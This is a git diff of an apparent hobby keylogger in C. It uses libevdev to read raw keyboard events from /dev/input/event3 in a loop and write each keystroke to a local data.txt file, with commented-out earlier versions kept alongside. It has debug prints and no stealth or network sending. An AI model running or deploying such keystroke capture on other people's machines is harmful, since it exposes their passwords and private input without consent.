@@ -28,81 +28,251 @@ void end_keylogger(void) {
   // IMPLEMENTATION HERE
 }
 
-int keylogger_test_1(void) {
-  // int err;
-  // struct libevdev *dev;
-  // struct libevdev_uinput *uidev;
+// void log_device(void) {
+//   // open a file to write to. If it doesn't exist yet, this creates it
+//   FILE* data_storage = fopen("data.txt", "w");
+//   if (data_storage == NULL) {
+//     printf("Error with opening the text file!");
+//     exit(1);
+//   }
 
-  // dev = libevdev_new();
-  // libevdev_set_name(dev, "fake keyboard device");
+//   struct libevdev* dev;
+//   int rc;
 
-  // libevdev_enable_event_type(dev, EV_KEY);
-  // libevdev_enable_event_code(dev, EV_KEY, KEY_A, NULL);
+//   // open a new device from the file descriptor and initialize
+//   int fd = open("/dev/input/event0", O_RDONLY | O_NONBLOCK);
+//   if (fd < 0) {
+//     printf("error opening event0 %d\n", EXIT_FAILURE);
+//     fprintf(stderr, "error opening file: %d %s\n", errno, strerror(errno));
+//     exit(0);
+//   }
+//   rc = libevdev_new_from_fd(fd, &dev);
+//   if (rc < 0) {
+//     fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
+//     fclose(data_storage);
+//     exit(0);
+//   }
 
-  // err = libevdev_uinput_create_from_device(dev,
-  //     LIBEVDEV_UINPUT_OPEN_MANAGED,
-  //     &uidev);
+//   // Use the getter functions to gather info about the device
+//   printf("Device: %s | vendor: %x | product: %x\n", libevdev_get_name(dev),
+//          libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));
 
-  // if (err != 0)
-  //   printf("err = %d\n", err);
-  //   return err;
+//   // TODO: store this data in a struct
 
-  // libevdev_uinput_write_event(uidev, EV_KEY, KEY_A, 1);
-  // libevdev_uinput_write_event(uidev, EV_SYN, SYN_REPORT, 0);
-  // libevdev_uinput_write_event(uidev, EV_KEY, KEY_A, 0);
-  // libevdev_uinput_write_event(uidev, EV_SYN, SYN_REPORT, 0);
+//   // store data into text file
+//   fprintf(data_storage, "Device: %s | vendor: %x | product: %x\n",
+//           libevdev_get_name(dev), libevdev_get_id_vendor(dev),
+//           libevdev_get_id_product(dev));
 
-  // libevdev_uinput_destroy(uidev);
-  
-  int err;
-  int fd, new_fd, uifd;
-  struct libevdev *dev;
-  struct libevdev_uinput *uidev;
-  struct input_event ev[2];
-  fd = open("/dev/input/event0", O_RDONLY);
-  printf("1.1\n");
-  if (fd < 0) {
-      printf("error at 1\n");
-      return err;
+
+//   // clean up
+//   libevdev_free(dev);
+//   close(fd);
+//   fclose(data_storage);
+// }
+
+void handle_syn_dropped(struct libevdev* dev) {
+  struct input_event ev;
+  int rc = LIBEVDEV_READ_STATUS_SYNC;
+
+  while (rc == LIBEVDEV_READ_STATUS_SYNC) {
+    rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_SYNC, &ev);
+    if (rc < 0) {
+      if (rc != -EAGAIN) fprintf(stderr, "error %d (%s)\n", -rc, strerror(-rc));
+      return;
+    }
+
+    printf("State change since SYN_DROPPED for %s %s value %d\n",
+           libevdev_event_type_get_name(ev.type),
+           libevdev_event_code_get_name(ev.type, ev.code), ev.value);
   }
-  err = libevdev_new_from_fd(fd, &dev);
-  if (err != 0) {
-      printf("error at 2\n");
-      return err;
-  }
-  uifd = open("/dev/uinput", O_RDWR);
-  if (uifd < 0) {
-      printf("error at 3\n");
-      return -errno;
-  }
-  err = libevdev_uinput_create_from_device(dev, uifd, &uidev);
-  if (err != 0) {
-      printf("error at 4\n");
-      return err;
-  }
-  // post a REL_X event
-  err = libevdev_uinput_write_event(uidev, EV_REL, REL_X, -1);
-  if (err != 0) {
-      printf("error at 5\n");
-      return err;
-  }
-  libevdev_uinput_write_event(uidev, EV_SYN, SYN_REPORT, 0);
-  if (err != 0) {
-      printf("error at 6\n");
-      return err;
-  }
-  libevdev_uinput_destroy(uidev);
-  libevdev_free(dev);
-  close(uifd);
-  close(fd);
-  printf("Complete\n");
-  return 0;
 }
 
+// void log_keys(void) {
+//   // open a file to write to. If it doesn't exist yet, this creates it
+//   FILE* data_storage = fopen("data.txt", "w");
+//   if (data_storage == NULL) {
+//     printf("Error with opening the text file!");
+//     exit(1);
+//   }
+
+//   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
+
+//   // open a device, as libevdev expects a file descriptor. You should have root
+//   // permissions
+//   struct libevdev* keyboard_dev;
+//   int rc;
+
+//   // get keyboard inputs event file
+//   int keyboard_fd = open("/dev/input/event3", O_RDONLY | O_NONBLOCK);
+//   if (keyboard_fd < 0) {
+//     fprintf(stderr, "error opening event3 file: %d %s\n", errno,
+//             strerror(errno));
+//     exit(0);
+//   }
+//   rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
+//   if (rc < 0) {
+//     fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
+//     fclose(data_storage);
+//     exit(0);
+//   }
+
+//   printf("does keyboard have key events? (1 = yes): %d\n",
+//          libevdev_has_event_type(keyboard_dev, EV_KEY));
+
+//   while (1) {
+//     struct input_event ev;
+
+//     // other options: LIBEVDEV_READ_FLAG_NORMAL
+//     rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
+//     if (rc < 0) {
+//       // note that this section runs when no event is occurring, NOT necessarily
+//       // when there is an error printf("value of rc: %d\n", rc);
+//       if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
+//       // exit(0);
+//     } else if (rc == LIBEVDEV_READ_STATUS_SYNC) {
+//       printf("uhhh x2\n");
+//       handle_syn_dropped(keyboard_dev);
+//     } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
+//       // handle event here
+//       printf("We have an event!\n%d (%s) %d (%s) value %d\n", ev.type,
+//              libevdev_event_type_get_name(ev.type), ev.code,
+//              libevdev_event_code_get_name(ev.type, ev.code), ev.value);
+
+//       // TODO: make key struct, add to key package. do the file writing in another file
+
+//       // write to text file
+//       fprintf(data_storage, "Event: %d (%s) %d (%s) value: %d\n", ev.type,
+//               libevdev_event_type_get_name(ev.type), ev.code,
+//               libevdev_event_code_get_name(ev.type, ev.code), ev.value);
+//     } else {
+//       printf("unsure of what is going on here..\n");
+//     }
+
+//     // TODO: change this. instead of writing to the file upon exiting
+//     // upon pressing "c" (represented by code 46), it should write to the
+//     // file every few seconds.
+//     if (ev.code == 46) {
+//       printf("exiting\n");
+//       exit(1);
+//     }
+//   }
+
+//   // Clean up
+//   libevdev_free(keyboard_dev);
+//   close(keyboard_fd);
+//   fclose(data_storage);
+// }
+
 int main(void) {
-  printf("1\n");
-  int x = keylogger_test_1();
-  printf("returns: %d\n", x);
-  printf("2\n");
+  // log_keys();
+
+  // open a file to write to. If it doesn't exist yet, this creates it
+    FILE* data_storage = fopen("data.txt","w");
+    if (data_storage == NULL) {
+        printf("Error with opening the text file!");
+        exit(1);
+    }
+
+    // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
+
+    // open a device, as libevdev expects a file descriptor. You should have root permissions
+    struct libevdev *dev;
+    struct libevdev *keyboard_dev;
+    int fd;    // note that this will be for event0, which is the lid switch
+    int rc;
+
+    // open a new device from the file descriptor and initialize
+    fd = open("/dev/input/event0", O_RDONLY|O_NONBLOCK);
+    if (fd < 0) {
+        printf("error opening event0 %d\n", EXIT_FAILURE);
+        fprintf(stderr, "error opening file: %d %s\n", errno, strerror(errno));
+        return EXIT_FAILURE;
+    }
+    rc = libevdev_new_from_fd(fd, &dev);
+    if (rc < 0) {
+        fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
+        fclose(data_storage);
+        return EXIT_FAILURE;
+    }
+
+
+    // Use the getter functions to gather info about the device
+    printf("Device: %s | vendor: %x | product: %x\n",
+        libevdev_get_name(dev),
+        libevdev_get_id_vendor(dev),
+        libevdev_get_id_product(dev));
+    
+    // TODO: store this data in a struct
+
+    // store data into text file
+    fprintf(data_storage, "Device: %s | vendor: %x | product: %x\n",
+        libevdev_get_name(dev),
+        libevdev_get_id_vendor(dev),
+        libevdev_get_id_product(dev));
+
+    // get keyboard inputs event file
+    int keyboard_fd = open("/dev/input/event3", O_RDONLY|O_NONBLOCK);
+    if (keyboard_fd < 0) {
+        fprintf(stderr, "error opening event3 file: %d %s\n", errno, strerror(errno));
+        return EXIT_FAILURE;
+    }
+    rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
+    if (rc < 0) {
+        fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
+        fclose(data_storage);
+        return EXIT_FAILURE;
+    }
+
+    printf("does keyboard have key events? (1 = yes): %d\n", libevdev_has_event_type(keyboard_dev, EV_KEY));
+
+    while (1) {
+        struct input_event ev;
+
+        // other options: LIBEVDEV_READ_FLAG_NORMAL
+        rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
+        if (rc < 0) {
+            // note that this section runs when no event is occurring, NOT necessarily when there is an error
+            // printf("value of rc: %d\n", rc);
+            if (rc != -EAGAIN)
+                printf("1 error: %d %s\n", -rc, strerror(-rc));
+                // exit(0);
+        } else if (rc == LIBEVDEV_READ_STATUS_SYNC) {
+            printf("uhhh x2\n");
+            handle_syn_dropped(dev);
+        } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
+            // handle event here
+            printf("We have an event!\n%d (%s) %d (%s) value %d\n",
+                ev.type, libevdev_event_type_get_name(ev.type),
+                ev.code, libevdev_event_code_get_name(ev.type, ev.code),
+                ev.value);
+            // exit(1);
+
+            // TODO: make key struct, add to key package
+
+            // write to text file
+            // TODO: i think writing to the file should be handled in another file. but the implementation is here
+            fprintf(data_storage, "Event: %d (%s) %d (%s) value: %d\n",
+                ev.type, libevdev_event_type_get_name(ev.type),
+                ev.code, libevdev_event_code_get_name(ev.type, ev.code),
+                ev.value);
+        } else {
+            printf("unsure \n");
+        }
+
+        // TODO: change this. instead of writing to the file upon exiting
+        // upon pressing "c" (represented by code 46), it should write to the
+        // file every few seconds. 
+        if (ev.code == 46) {
+            printf("exiting\n");
+            exit(1);
+        }
+    }
+
+    // Clean up
+    libevdev_free(dev);
+    close(fd);
+    close(keyboard_fd);
+    fclose(data_storage);
   return 0;
 }
